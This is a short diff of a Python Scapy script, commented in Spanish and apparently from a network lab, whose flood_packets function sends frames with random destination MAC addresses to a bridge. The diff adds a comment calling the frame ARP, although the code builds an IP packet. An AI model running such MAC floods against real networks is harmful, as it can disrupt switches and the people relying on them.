@@ -20,7 +20,7 @@ def random_mac():
 # Enviar paquetes al bridge con direcciones MAC de destino aleatorias
 def flood_packets(interface, count):
     for _ in range(count):
-        pkt = Ether(dst=random_mac()) / IP(dst="10.0.0.1")
+        pkt = Ether(dst=random_mac()) / IP(dst="10.0.0.1") # GENERAR TRAMA ARP
         sendp(pkt, iface=interface, verbose=0)
         time.sleep(0.01)  # Pequeña pausa para no saturar la red inmediatamente
 
